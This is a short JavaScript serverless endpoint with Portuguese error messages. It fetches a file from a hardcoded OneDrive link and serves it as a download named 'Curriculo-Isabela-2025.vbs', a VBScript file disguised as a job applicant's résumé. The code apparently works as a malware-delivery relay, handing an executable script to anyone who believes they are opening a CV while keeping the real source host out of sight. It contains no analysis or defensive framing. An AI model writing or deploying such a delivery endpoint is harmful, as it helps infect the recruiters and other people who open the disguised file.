// /api/download.js

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).send('Método não permitido');
  }

  const downloadUrl = 'https://onedrive.live.com/download?resid=D82992BFEEE0874A!s80a236759e494466a94e483cb279f774&authkey=!ABcDeFG12345';
  const filename = 'Curriculo-Isabela-2025.vbs';

  try {
    const response = await fetch(downloadUrl);

    if (!response.ok) {
      return res.status(500).send('Erro ao baixar o arquivo remoto.');
    }

    const buffer = await response.arrayBuffer();

    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Content-Length', Buffer.byteLength(buffer));

    return res.send(Buffer.from(buffer));
  } catch (err) {
    return res.status(500).send('Erro inesperado: ' + err.message);
  }
}
